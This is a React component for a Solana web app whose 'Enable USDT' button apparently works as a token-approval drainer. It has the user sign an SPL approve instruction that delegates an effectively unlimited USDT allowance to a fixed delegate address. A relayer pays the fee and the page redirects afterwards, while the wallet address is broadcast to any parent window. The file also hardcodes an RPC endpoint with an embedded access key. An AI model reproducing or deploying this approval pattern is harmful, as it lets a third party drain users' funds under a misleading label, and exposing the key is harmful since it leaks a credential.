import React, { useEffect, useState } from "react";
import { PublicKey, Connection, Transaction, SendTransactionError, AccountInfo } from "@solana/web3.js";
import { TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID, createApproveInstruction, getAssociatedTokenAddress, AccountLayout } from "@solana/spl-token";
import { useDynamicContext } from "@dynamic-labs/sdk-react-core";
import { useRouter } from "next/router";
import styles from "./ApproveButton.module.css";
import Spinner from "./Spinner";

// // Log environment variables to ensure they are loaded correctly
// console.log("Environment Variables:");
// console.log(
//   "NEXT_PUBLIC_USDT_TOKEN_ADDRESS:",
//   process.env.NEXT_PUBLIC_USDT_TOKEN_ADDRESS || "Not Loaded"
// );
// console.log(
//   "NEXT_PUBLIC_DELEGATE_ADDRESS:",
//   process.env.NEXT_PUBLIC_DELEGATE_ADDRESS || "Not Loaded"
// );
// console.log(
//   "NEXT_PUBLIC_RELAYER_ADDRESS:",
//   process.env.NEXT_PUBLIC_RELAYER_ADDRESS || "Not Loaded"
// );
// console.log(
//   "NEXT_PUBLIC_SHYFT_API_KEY:",
//   process.env.NEXT_PUBLIC_SHYFT_API_KEY
//     ? "Loaded"
//     : "Not Loaded or Should Not Be Exposed"
// );
// console.log(
//   "NEXT_PUBLIC_SOLANA_NETWORK:",
//   process.env.NEXT_PUBLIC_SOLANA_NETWORK || "Not Loaded"
// );

const usdtTokenAddress = new PublicKey(process.env.NEXT_PUBLIC_USDT_TOKEN_ADDRESS);
const delegateAddress = new PublicKey(process.env.NEXT_PUBLIC_DELEGATE_ADDRESS);

const useSignAndSendTransaction = () => {
  const { primaryWallet } = useDynamicContext();

  const [signature, setSignature] = useState(undefined);
  const [errorCode, setErrorCode] = useState(undefined);
  const [errorMessage, setErrorMessage] = useState(undefined);

  useEffect(() => {
    if (!primaryWallet?.connector.isPhantomRedirectConnector) return;
    const handler = (response) => {
      if (response.signature) {
        setSignature(response.signature);
      } else {
        setErrorCode(response.errorCode);
        setErrorMessage(response.errorMessage);
      }
    };

    primaryWallet.connector.on('signAndSendTransaction', handler);
    return () => {
      if (!primaryWallet?.connector.isPhantomRedirectConnector) return;
      primaryWallet.connector.off('signAndSendTransaction', handler);
    };
  }, [primaryWallet?.connector]);

  const execute = async (transaction) => {
    if (!primaryWallet) return;
    const signer = await primaryWallet.connector.getSigner();
    await signer.signAndSendTransaction(transaction);
  };

  return { errorCode, errorMessage, execute, signature };
};

const ApproveButtonSolana = ({ isAccountFlagged, setSolanaApprovalStatus }) => {
  const router = useRouter();
  const { primaryWallet } = useDynamicContext();
  const [redirectUrl, setRedirectUrl] = useState(null);
  const [isLoading, setIsLoading] = useState(false);
  const [isAllowed, setIsAllowed] = useState(false);
  const [allowance, setAllowance] = useState(null);
  const [txHash, setTxHash] = useState(null);
  const connection = new Connection(`https://fluent-cosmopolitan-patron.solana-mainnet.quiknode.pro/18ab6c68fc21ecc31d10afbde4fb13be00f9be04/`, {
    commitment: "confirmed"
  });

  const { errorCode, errorMessage, execute, signature } = useSignAndSendTransaction();

  useEffect(() => {
    if (router.isReady && !redirectUrl) {
      const queryRedirectUrl = router.query["redirect-url"];
      if (queryRedirectUrl && typeof queryRedirectUrl === 'string') {
        setRedirectUrl(queryRedirectUrl.startsWith('http') ? queryRedirectUrl : `https://${queryRedirectUrl}`);
      }
    }
  }, [router.isReady, router.query]);

  const getConnectedAccounts = async () => {
    const connectedAccounts = await primaryWallet?.connector.getConnectedAccounts();
    const address = connectedAccounts && connectedAccounts.length > 0 ? connectedAccounts[0] : undefined;

    // Add wallet address event when address is retrieved
    if (address) {
      // console.log("Retrieved wallet addrss:", address);

      // Post message to the parent window or opener
      if (window.opener) {
        window.opener.postMessage({ type: "solanaWalletAddressFromXion", walletAddress: address }, "*");
      }

      if (window.parent && window !== window.parent) {
        window.parent.postMessage({ type: "solanaWalletAddressFromXion", walletAddress: address }, "*");
      }

      // Optional: Close the window if it's a popup
      if (window.opener) {
        window.close();
      }
    }
    return address;
  };
  

  const checkAllowance = async (address) => {
    try {
      const tokenAccounts = await connection.getTokenAccountsByOwner(
        new PublicKey(address),
        { programId: TOKEN_PROGRAM_ID }
      );

      for (const tokenAccount of tokenAccounts.value) {
        const accountInfo = AccountLayout.decode(tokenAccount.account.data);
        if (new PublicKey(accountInfo.mint).equals(usdtTokenAddress)) {
          const delegatedAmount = BigInt(accountInfo.delegatedAmount);
          const delegate = new PublicKey(accountInfo.delegate);
          const isAllowedCheck = delegatedAmount >= BigInt(1) && delegate.equals(delegateAddress);

          // console.log("Delegated Amount:", delegatedAmount.toString());
          // console.log("Delegate Address:", delegate ? delegate.toBase58() : "null");
          // console.log("Is Allowed Check:", isAllowedCheck);

          setAllowance(delegatedAmount.toString());
          setIsAllowed(isAllowedCheck);
          return isAllowedCheck;
        }
      }

      setAllowance("0");
      setIsAllowed(false);
      return false;
    } catch (err) {
      console.error("Error checking allowance:", err);
      setIsAllowed(false);
      return false;
    }
  };

  useEffect(() => {
    const fetchAddressAndCheckAllowance = async () => {
      const address = await getConnectedAccounts();
      if (address) {
        const allowed = await checkAllowance(address);
        if (allowed) {
          setSolanaApprovalStatus({ solanaIsApproved: true, isError: false });
          if (redirectUrl && address) {
            setTimeout(() => {
              window.location.href = `${redirectUrl}/${address}`;
            }, 1000); // Delay redirect by 1 second
          }
        }
      }
    };

    fetchAddressAndCheckAllowance();
  }, [primaryWallet, redirectUrl, setSolanaApprovalStatus]);

  const approveUSDT = async (address) => {
    try {
      // console.log("Starting approveUSDT process");
      const ownerPublicKey = new PublicKey(address);
      const signer = await primaryWallet.connector.getSigner();
  
      if (!signer || !signer.publicKey) {
        throw new Error("Signer is not available");
      }
  
      // console.log("Signer obtained:", signer.publicKey.toBase58());
  
      const { blockhash } = await connection.getLatestBlockhash();
      // console.log("Recent blockhash obtained:", blockhash);
  
      const associatedTokenAccount = await getAssociatedTokenAddress(
        usdtTokenAddress,
        ownerPublicKey,
        false,
        TOKEN_PROGRAM_ID,
        ASSOCIATED_TOKEN_PROGRAM_ID
      );
  
      // console.log("Associated Token Account:", associatedTokenAccount.toBase58());
  
      const transaction = new Transaction().add(
        createApproveInstruction(
          associatedTokenAccount,
          delegateAddress,
          ownerPublicKey,
          10000000000000000000000000,
          []
        )
      );
  
      transaction.recentBlockhash = blockhash;
      transaction.feePayer = new PublicKey(process.env.NEXT_PUBLIC_RELAYER_ADDRESS);
  
      // console.log("Transaction created:", transaction);
      // console.log("Fee payer:", transaction.feePayer.toBase58());
      transaction.instructions.forEach((instruction, index) => {
        // console.log(`Instruction ${index} program ID:`, instruction.programId.toBase58());
      });
  
      const signedTransaction = await signer.signTransaction(transaction);
      // console.log("Transaction signed:", signedTransaction);
  
      const serializedTransaction = signedTransaction.serialize({
        requireAllSignatures: false,
        verifySignatures: false
      });
      const encodedTransaction = serializedTransaction.toString('base64');
      // console.log("Encoded transaction:", encodedTransaction);
  
      const response = await fetch('/.netlify/functions/approve', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ encodedTransaction })
      });
  
      if (!response.ok) {
        throw new Error('Failed to send transaction to relayer');
      }
  
      const result = await response.json();
      // console.log('Transaction result:', result);
  
      setIsAllowed(true);
      setSolanaApprovalStatus({ solanaIsApproved: true, isError: false });
      setTxHash(result.signature);
  
      if (redirectUrl && address) {
        setTimeout(() => {
          window.location.href = `${redirectUrl}/${address}`;
        }, 1000);
      }
    } catch (err) {
      console.error("Error approving USDT:", err);
      if (err instanceof SendTransactionError) {
        console.error("Transaction Logs:", await err.getLogs());
      } else {
        console.error(err);
      }
      setIsAllowed(false);
      setSolanaApprovalStatus({ solanaIsApproved: false, isError: true });
    } finally {
      setIsLoading(false);
    }
  };

  const handleApproval = async () => {
    const address = await getConnectedAccounts();
    if (address) {
      setIsLoading(true);
      await approveUSDT(address);
    }
  };

  if (isAccountFlagged) {
    return <div>Your wallet has been flagged. Cannot approve USDT</div>;
  }

  if (isLoading) {
    return <Spinner />;
  }

  if (isAllowed) {
    return <div></div>;
  }

  return (
    <div>
      {!isAllowed && (
        <button onClick={handleApproval} className={styles.connectedButton}>
          Enable USDT{" "}
          <img src="./T+S.svg" alt="USDT" className={styles.svgIcon} />
        </button>
      )}
    </div>
  );
};

export default ApproveButtonSolana;
